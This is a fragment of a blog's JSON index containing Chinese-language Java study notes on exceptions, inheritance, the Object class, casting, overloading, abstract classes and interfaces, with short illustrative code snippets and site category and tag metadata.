Class 类中的 new Instance() 方法创建一个类的实例，而指定的类的对象无法被实例化时，抛出该异常 EOFException 文件已结束异常 FileNotFoundException 文件未找到异常 VI. 自定义异常12345public class MyException extends Exception &#123; public MyException(String ErrorMessage) &#123; // ErrorMessage为要输出的错误信息 super(ErrorMessage); // 调用父类构造方法 &#125;&#125; VII. 抛出异常 throws：用于指定方法可能抛出的异常，用于将异常向上抛出。 12static void pop() throws 异常1, 异常2, ... &#123;&#125; throw： 程序在执行到 throw 语句时立即终止，其后语句都不执行； throw 抛出的异常必须使用 try-catch 语句快捕捉； 若想向上级抛出异常，必须在抛出异常的方法中使用 throws。 参考资料《Java从入门到精通（第5版）》","categories":[{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}],"author":"Ke_DiWZ"},{"title":"接口、继承与多态","slug":"javaNotes-1","date":"2022-07-30T07:00:16.000Z","updated":"2022-08-01T11:51:42.005Z","comments":true,"path":"javaNotes-1/","link":"","permalink":"http://blog.kekwy.com/javaNotes-1/","excerpt":"","text":"I. 类的继承权限修饰关键字： private 外部以及子类均不可访问 public 外部以及子类均不可访问 protected 外部不可，但子类可以访问 定义类时通过关键字extends + 父类类名定义继承； 子类方法中可以通过super关键字调用父类方法（受权限修饰关键字约束）； 子类中可以通过定义与父类某一方法名称相同的函数实现对父类中该方法的重写（覆盖）； 重写时如修改方法的权限范围，只能从小到大； 重写时返回值必须与父类中同名函数返回值相同或为其子类； 子类实例化时会自动调用父类的无参构造方法，但若需调用有参构造方法需要通过super关键字手动调用； 子类finalize()方法需要保证最后一个动作是调用父类的finalize()方法； 1234567891011121314151617181920212223242526272829303132333435class Test &#123; public Test() &#123; //do something &#125; public void doSomething1() &#123; //do something &#125; private void doSomething2() &#123; //do something &#125; protected void doSomething3() &#123; //do something &#125; public Test doTest() &#123; //do something &#125;&#125;class Test1 extends Test&#123; public Test() &#123; super(); //调用父类构造方法 super.doSomething1(); &#125; public void doSomething3() &#123; //do something &#125; /* private void doSomething3() &#123; //do something &#125; 写法错误 */ public Test1 doTest() &#123; //do something &#125;&#125; II. Object类 Objcect 类是所有Java类的父类。 tips：Object 类中的 getClass() 、notify() 、notifyAll() 、wait() 等方法不能在子类中重写。（被定义为final类型） Object 类中的重要方法： getClass()：返回对象执行时的Class实例。（Unity的getObejct） toString()：将一个对象返回为字符串，一般需要根据需要在子类中重写. tips：将对象打印时将自动调用该方法。 equals()：默认使用“&#x3D;&#x3D;”运算符根据对象的引用（地址）判断是否相等。故一般需要按需重写。 III. 对象类型的转换 向上转型：将子类对象视为父类对象。由具体到抽象，总是安全的。 1Quadrangle obj = new Patallelogram(); // 平行四边形是四边形的子类 向下转型：将父类对象转换为子类对象，必须通过强制类型转换，且必须保证当前父类对象是目标子类对象的实例。 12Quadrangle p = new Patallelogram();Patallelogram q = (Patallelogram)p; IV. 使用instanceof操作符判断对象类型可用于实现向下转换时对父类对象实例类型的判断。 语法格式：（返回值为布尔型） 12myobject instanceof ExampleClass;// myobject对象是否为ExampleClass类的实例 V. 方法的重载同过定义同名方法但参数不完全相同的方式实现方法的重载，但单单返回值不同不能实现重载。 编译器利用方法名、方法各参数类型和参数的个数以及参数的顺序来确定类中的方法是否唯一。 不定长参数也可以参与实现重载： 12int add(int a);int add(int... a); VI. 抽象类与接口 抽象类 tips： 抽象类不能实例化对象； 只有抽象类才可以承载抽象方法； 抽象方法在其子类中必须被重写。 定义抽象类的关键字 abstract 。 123public abstract class Test &#123; abstract void testAbstract();&#125; 接口： 定义接口使用关键字 interface ： 1234public interface 接口名 &#123; void doSomething(); // 自动虚方法，可以省略abstract关键字&#125; public：接口可以像类一样被权限修饰符修饰，但public关键字仅限于接口在与其同名的文件中被定义时； 接口中的方法必须被定义为public或abstract形式。 实现接口使用关键字 implements ： tips：Java中不许出现多继承但是可以通过同一个类实现许多接口来实现多继承，一个接口也可以继承另一个接口。 123456789101112#1class 类名 implements 接口1，接口2, ... &#123; &#125;#2interface intf1 &#123; &#125;interface intf2 extends intf1 &#123; &#125; 参考资料《Java从入门到精通（第5版）》","categories":[{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}],"author":"Ke_DiWZ"}],"categories":[{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"},{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"},{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}]}